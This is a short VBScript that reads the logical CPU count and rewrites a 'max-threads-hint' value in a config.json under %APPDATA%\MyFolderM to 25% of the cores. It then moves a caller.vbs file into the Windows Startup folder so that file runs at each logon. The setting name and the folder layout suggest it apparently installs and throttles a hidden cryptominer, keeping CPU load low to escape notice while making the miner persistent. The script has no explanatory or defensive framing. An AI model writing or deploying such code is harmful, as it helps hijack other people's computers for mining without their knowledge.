' Detect CPU count
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set colItems = objWMIService.ExecQuery("Select * from Win32_Processor")

' Initialize CPU count
CPUCount = 0

' Loop through all processors to count them
For Each objItem in colItems
    CPUCount = objItem.NumberOfLogicalProcessors
Next

' If CPU count is 0, exit the script
If CPUCount = 0 Then
    WScript.Echo "Error: Unable to detect CPU count. Exiting."
    WScript.Quit
End If

' Calculate 25% CPU usage
MaxThreads = Int(CPUCount * 0.25)

' Update config.json with new max-threads-hint value
configFilePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%\MyFolderM\config.json")

' Open config.json for reading and updating
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(configFilePath) Then
    Set configFile = fso.OpenTextFile(configFilePath, 1)
    configText = configFile.ReadAll
    configFile.Close
    
    ' Replace the max-threads-hint value correctly
    updatedText = Replace(configText, """max-threads-hint"": 100", """max-threads-hint"": " & MaxThreads)
    
    ' Write the updated config back to the file
    Set configFile = fso.OpenTextFile(configFilePath, 2)
    configFile.Write updatedText
    configFile.Close
Else
    WScript.Echo "Error: config.json not found. Exiting."
    WScript.Quit
End If

' Move caller.vbs to the Startup folder
startupFolder = CreateObject("WScript.Shell").SpecialFolders("Startup")
callerVbsPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%\MyFolderM\caller.vbs")

' Check if caller.vbs exists
If fso.FileExists(callerVbsPath) Then
    ' Move caller.vbs to the Startup folder
    fso.MoveFile callerVbsPath, startupFolder & "\caller.vbs"
    WScript.Echo "caller.vbs moved to Startup folder."
Else
    WScript.Echo "Error: caller.vbs not found. Exiting."
    WScript.Quit
End If
